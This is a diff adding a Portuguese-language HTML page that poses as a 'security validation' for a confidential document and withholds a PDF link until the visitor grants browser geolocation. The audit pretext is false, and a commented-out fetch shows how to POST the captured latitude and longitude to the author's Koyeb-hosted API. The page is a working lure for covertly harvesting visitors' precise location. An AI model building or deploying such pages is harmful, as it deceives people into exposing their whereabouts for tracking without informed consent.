@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Seguro</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background-color: #1e2130; 
+            color: #fff;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.2);
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+        #conteudo-secreto { 
+            display: none; 
+            margin-top: 20px; 
+            padding: 20px; 
+            background: #2a2d3e; 
+            border-radius: 8px; 
+            border-left: 4px solid #10b981;
+        }
+        .btn { 
+            padding: 12px 24px; 
+            background-color: #3b82f6; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: bold;
+        }
+        .btn:hover {
+            background-color: #2563eb;
+        }
+        #mensagem { 
+            color: #ef4444; 
+            margin-top: 15px; 
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Validação de Segurança</h2>
+        <p>Este documento é confidencial. Para acessá-lo, você precisa confirmar sua localização para a auditoria de acesso.</p>
+        
+        <button class="btn" id="btn-liberar" onclick="solicitarLocalizacao()">Liberar Acesso</button>
+        <p id="mensagem"></p>
+
+        <div id="conteudo-secreto">
+            <h3 style="color: #10b981;">Acesso Liberado</h3>
+            <p>A auditoria foi concluída com sucesso. Você já pode visualizar o documento.</p>
+            <br>
+            <a href="seu_arquivo_real.pdf" style="color: #3b82f6; text-decoration: none; font-weight: bold;">Clique aqui para baixar o PDF</a>
+        </div>
+    </div>
+
+    <script>
+        function solicitarLocalizacao() {
+            const msg = document.getElementById("mensagem");
+            const btn = document.getElementById("btn-liberar");
+            const conteudo = document.getElementById("conteudo-secreto");
+
+            if (!navigator.geolocation) {
+                msg.innerHTML = "Seu navegador não suporta validação de localização.";
+                return;
+            }
+
+            msg.innerHTML = "Aguardando permissão do sistema...";
+            msg.style.color = "#f59e0b"; // Amarelo de carregamento
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Usuário clicou em Permitir
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Se você quiser registrar isso no seu servidor Python que está rodando no Koyeb,
+                    // basta fazer um fetch POST para a sua rota de API aqui. Exemplo:
+                    /*
+                    fetch('https://sua-api.koyeb.app/registrar-acesso', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ latitude: lat, longitude: lon })
+                    });
+                    */
+
+                    conteudo.style.display = "block";
+                    btn.style.display = "none";
+                    msg.innerHTML = "";
+                },
+                function(error) {
+                    // Usuário clicou em Bloquear ou ocorreu outro erro
+                    msg.innerHTML = "Acesso Negado: É obrigatório conceder a permissão de localização para prosseguir.";
+                    msg.style.color = "#ef4444";
+                }
+            );
+        }
+    </script>
+</body>
+</html>
